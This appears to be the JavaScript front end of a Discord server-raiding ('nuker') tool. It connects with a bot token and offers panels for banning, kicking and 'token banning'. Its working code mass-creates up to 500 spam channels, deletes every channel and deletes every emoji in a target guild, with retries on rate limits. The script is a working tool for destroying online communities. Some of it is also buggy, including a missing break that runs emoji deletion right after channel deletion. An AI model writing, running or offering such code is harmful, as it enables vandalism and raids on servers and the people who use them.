const dataLogging = true;
const api = 'https://discordapp.com/api/';
let token, increment;

$(() => {
  let actions = $('#picker')[0].children;
  select(actions[0]);
  for (i = 1; i < actions.length; i++) actions[i].classList.add('locked');
});

const sleep = ms => { return new Promise(resolve => setTimeout(resolve, ms)); }

const select = elem => {

  if (elem.classList.contains('locked')) return;

  for (btn of $('#picker')[0].children) btn.classList.remove('selected');
  elem.classList.add('selected');

  const modHTML = (title, params, btnText) => {
    let container = $('#container')[0];
    container.innerHTML = `<h2 class="containerTitle">${title}</h2>`;
    params.forEach(param => { container.innerHTML += `<input type="text" placeholder="${param}">`; });
    container.innerHTML += `<button id="executeBtn" onClick="execute(this)">${btnText}</button>`;
    container.innerHTML += `<span id="resultText"></span>`;
  }

  increment = 0;

  switch (elem.innerText) {

    case 'MAIN':
      modHTML('Login', ['Bot Token'], 'Connect');
      break;

    case 'BAN':
      modHTML('Ban', ['Guild ID'], 'Ban');
      break;

    case 'KICK':
      modHTML('Kick', ['Guild ID'], 'Kick');
      break;

    case 'UNBAN':
      modHTML('Unban', ['Guild ID'], 'Unban');
      break;

    case 'CREATE CHANNEL':
      modHTML('Create Channels', ['Guild ID', 'Channel Name'], 'Create');
      break;

    case 'DELETE CHANNEL':
      modHTML('Delete Channels', ['Guild ID'], 'Delete');
      break;

    case 'EMOJI DELETE':
      modHTML('Delete  Emojis', ['Guild ID'], 'Delete');
      break;

    case 'TOKEN BANNER':
      modHTML('Token Banner', ['Token'], 'Ban');
      break;

    case 'CREATE SERVER':
      modHTML('Create Server', ['Name'], 'Create');
      break;

  }
}

const execute = async elem => {

  let params = $('#container')[0].children;

  maxChannels = false;

  switch (elem.parentElement.firstElementChild.innerText) {

    case 'Login':
      token = 'Bot ' + elem.previousSibling.value;
      await fetch(api+'users/@me', {
        method: 'GET',
        headers: { 'Authorization': token }
      })
      .then(res => res.json())
      .then(data => {
        if (dataLogging) console.log(data);
        $('h3')[0].innerText = `Logged into ${data.username}#${data.discriminator}`;
        for (btn of $('#picker')[0].children) btn.classList.remove('locked');
      });
      break;
    
    case 'Create Channels':
      guildID = params[1].value;
      channelName = params[2].value;
      let i = 0;
      while (i < 500) {
        await fetch(api+'guilds/'+guildID+'/channels', {
          method: 'POST',
          headers: {
            'Authorization': token,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ name: channelName })
        })
        .then(async res => {
          console.log(res.status);
          switch (res.status) {
            case 201:
              i += 1;
              $('#resultText')[0].innerText = `Created ${i} channels`;
              console.log('good');
              break;
            case 400:
              i = 500;
              break;
            case 429:
              //console.log('rate limit');
              //await sleep(1000);
              break;
          }
          return res.json();
        })
        .then(data => {
          if (dataLogging) console.log(data);
        }); 
      }
      break;

    case 'Delete Channels':
      guildID = params[1].value;
      await fetch(api+'guilds/'+guildID+'/channels', {
        method: 'GET',
        headers: { 'Authorization': token }
      })
      .then(res => res.json())
      .then(async channels => {
        if (dataLogging) console.log(channels);
        let i = 0;
        while (i < channels.length) {
          fetch(api+'channels/'+channels[i].id, {
            method: 'DELETE',
            headers: { 'Authorization': token }
          })
          .then(async res => {
            console.log(res.status);
            switch (res.status) {
              case 200:
                i += 1;
                $('#resultText')[0].innerText = `Deleted ${i} channels`;
                break;
              case 429:
                //console.log('rate limit');
                //await sleep(1000);
                break;
            }
            return res.json();
          })
          .then(data => {
            if (dataLogging) console.log(data);
          });
        }
      });

    case 'Delete Emojis':
      guildID = params[1].value;
      fetch(api+'guilds/'+guildID+'/emojis', {
        method: 'GET',
        headers: { 'Authorization': token }
      })
      .then(res => res.json())
      .then(async emojis => {
        if (dataLogging) console.log(emojis);
        let i = 0;
        while (i < emojis.length) {
          await fetch(api+'guilds/'+guildID+'/emojis/'+emojis[i].id, {
            method: 'DELETE',
            headers: { 'Authorization': token }
          })
          .then(async res => {
            switch (res.status) {
              case 204:
                i += 1;
                $('#resultText')[0].innerText = `Deleted ${i} emojis`;
                break;
              case 429:
                console.log('rate limit');
                await sleep(1000);
                break;
            }
          })
        }
      });
  }
}